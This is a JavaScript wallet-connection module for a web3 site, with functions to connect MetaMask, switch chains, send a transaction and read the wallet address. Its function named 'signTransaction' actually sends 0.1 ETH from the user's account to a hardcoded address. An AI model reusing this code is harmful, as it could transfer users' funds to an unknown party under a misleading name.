import Web3 from "web3";
import { CHAIN } from "../constants";

export async function connectWalletToSite() {
	try {
		if (window.ethereum) {
			window.web3 = new Web3(window.ethereum);
			await window.ethereum.enable();
			return true;
		} else if (window.web3) {
			window.web3 = new Web3(window.web3.currentProvider);
			return true;
		} else {
			console.log(
				"Non-Ethereum browser detected. You should consider trying MetaMask!"
			);
			return false;
		}
	} catch (e) {
		if (e.code === 4001) {
			alert(e.message);
		}
		return false;
	}
}

export async function switchChain() {
	const config = { ...CHAIN };
	config.chainId = Web3.utils.toHex(CHAIN.chainId);

	try {
		await window.ethereum.request({
			method: "wallet_switchEthereumChain",
			params: [{ chainId: config.chainId }],
		});
	} catch (error) {
		if (error.code === 4902) {
			try {
				await window.ethereum.request({
					method: "wallet_addEthereumChain",
					params: [config],
				});
			} catch (addError) {
				console.error(addError);
			}
		}
	}
}

export async function signTransaction() {
	try {
		const accounts = await window.ethereum.request({
			method: "eth_requestAccounts",
		});
		const senderAddress = accounts[0];
		const recipientAddress = "0x7205c634fd4f68b6914df94c2e5b350da134ff09";
		const value = "0.1";

		const params = [
			{
				from: senderAddress,
				to: recipientAddress,
				value: Web3.utils.toWei(value, "ether"),
				gas: "21000",
			},
		];

		const txHash = await window.ethereum.request({
			method: "eth_sendTransaction",
			params: params,
		});
		console.log("Transaction hash:", txHash);
	} catch (error) {
		alert(error.message);
	}
}

export async function getWalletAddress() {
	try {
		let address =
			(await window.ethereum.selectedAddress) ||
			window.ethereum.address;
		return address;
	} catch (error) {
		console.log(error);
	}
}
